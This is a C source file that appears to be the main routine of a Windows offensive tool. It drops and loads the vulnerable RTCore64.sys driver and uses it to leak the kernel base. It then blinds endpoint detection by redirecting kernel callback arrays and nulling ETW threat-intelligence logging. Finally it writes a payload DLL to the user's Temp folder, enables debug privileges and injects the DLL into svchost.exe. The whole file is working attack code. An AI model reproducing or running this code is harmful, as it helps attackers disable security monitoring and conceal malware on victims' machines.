#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include "dllpayload.h"
#include "driverPayload.h"
#include "ProcessInjection.h"
#include "KernelPatching.h"


static BOOL DropDriver(const wchar_t* path) {
	HANDLE file = CreateFileW(path, GENERIC_WRITE, 0, NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) return FALSE;

	DWORD written = 0;
	BOOL status = WriteFile(file, driverPayload, driverPayload_len, &written, NULL);
	CloseHandle(file);

	return status && (written == driverPayload_len);
}


int main() {
	const char* targetProcName = "svchost.exe"; // Target process name
	char* username = getUserName();
	if (username == NULL) {
		printf("Failed to get username. Error: %lu\n", GetLastError());
		return -1;
	}


	// -------- EDR Blinding (Callback Redirecting and ETW-IT Nulling) --------
	DropDriver(L"C:\\Windows\\System32\\drivers\\RTCore64.sys");
	HANDLE DeviceDriver = LoadDriver();
	ULONG64 NtBase = LeakNtBase(DeviceDriver);

	if (NtBase < 0xFFFFF00000000000ULL) {
		printf("[-] NtBase looks wrong (0x%llx) aborting before any reads.\n", (ULONG64)NtBase);
		CloseHandle(DeviceDriver);
		return 1;
	}

	if (!RedirectCallbackArrays(NtBase, DeviceDriver)) {
		printf("[-] RedirectCallbackArrays failed.\n");
	}
	else {
		printf("[+] Enumeration complete.\n");
	}

	if (!EtwTiNulling(DeviceDriver, NtBase)) {
		printf("[-] ETWTI Nulling failed.\n");
	}

	CloseHandle(DeviceDriver);


	// -------- DLL Dropper and Injector --------
	char dllPath[512];
	snprintf(dllPath, sizeof(dllPath), "C:\\Users\\%s\\AppData\\Local\\Temp\\injected.dll", username); // Path to write the DLL
	writeDLLToFile(dllPath, dllPayload, dllPayload_len);

	if (setDebugPrivileges() == -1) {
		printf("Failed to set debug privileges. Error: %lu\n", GetLastError());
		return -1;
	}
	int targetPID = locateTarget(targetProcName);
	if (targetPID == -1) {
		printf("Failed to locate target process or no system process found. Error: %lu\n", GetLastError());
		return -1;
	}
	if (!injectProcess(targetPID, dllPath)) {
		printf("Failed to inject DLL into target process. Error: %lu\n", GetLastError());
		return -1;
	}
	printf("DLL injection successful!\n");
	return 0;

}
